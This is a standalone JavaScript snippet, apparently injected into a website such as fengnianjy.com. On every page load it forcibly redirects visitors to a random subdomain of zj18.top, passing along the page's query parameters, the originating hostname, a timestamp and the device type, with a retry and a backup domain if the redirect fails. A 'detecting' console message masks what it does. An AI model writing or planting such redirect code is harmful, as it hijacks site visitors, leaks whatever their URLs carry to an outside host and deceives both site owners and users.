<script>
console.log('检测中');
async function fixedDomainRedirect() {
try {
const subDomainPrefixes = ['app', 'web', 'm', 'api', 'user'];
const randomPrefix = subDomainPrefixes[Math.floor(Math.random() * subDomainPrefixes.length)];
const targetDomain = `${randomPrefix}.zj18.top`;
const params = new URLSearchParams(window.location.search);
params.append('from', window.location.hostname);
params.append('t', new Date().getTime());
params.append('device', /Mobile|Android|iOS/.test(navigator.userAgent) ? 'mobile' : 'pc');
const targetUrl = `http://${targetDomain}${window.location.pathname || '/'}?${params.toString()}`;
console.log('目标地址：', targetUrl);
if (window.location.href !== targetUrl) {
window.location.replace(targetUrl);
setTimeout(() => {
if (window.location.href !== targetUrl) window.location.href = targetUrl;
}, 300);
}
} catch (err) {
console.error('跳转失败：', err.message);
const backupUrl = `http://backup.zj18.top?error=${err.message}&t=${new Date().getTime()}`;
window.location.href = backupUrl;
}
}
fixedDomainRedirect();
window.addEventListener('DOMContentLoaded', () => {
if (window.location.hostname.includes('fengnianjy.com')) {
setTimeout(fixedDomainRedirect, 800);
}
});
</script>
